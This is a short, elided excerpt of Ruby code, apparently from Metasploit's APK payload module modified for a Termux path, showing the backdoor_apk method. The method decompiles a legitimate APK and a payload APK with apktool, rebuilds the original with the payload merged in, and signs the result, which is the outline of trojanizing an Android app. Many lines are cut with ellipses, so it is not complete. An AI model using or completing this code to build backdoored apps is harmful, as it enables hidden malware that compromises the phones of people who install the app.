...
class Msf::Payload::Apk
  ...
  def backdoor_apk(apkfile, raw_payload)
    ...
    tempdir = "/data/data/com.termux/files/usr/share/ubuntu-fs/root/.bind"
    ...
    run_cmd("rm -rf /data/data/com.termux/files/usr/share/ubuntu-fs/root/.bind/*")
    ...
    run_cmd("apktool d .bind/original.apk -o .bind/original")
    print_status "Decompiling payload APK..\n"
    run_cmd("apktool d .bind/payload.apk -o .bind/payload")
    ...
    apktool_output = run_cmd("apktool b -a /usr/bin/aapt -o .bind/output.apk .bind/original")
    ...
    run_cmd("signapk .bind/output.apk .bind/aligned.apk")
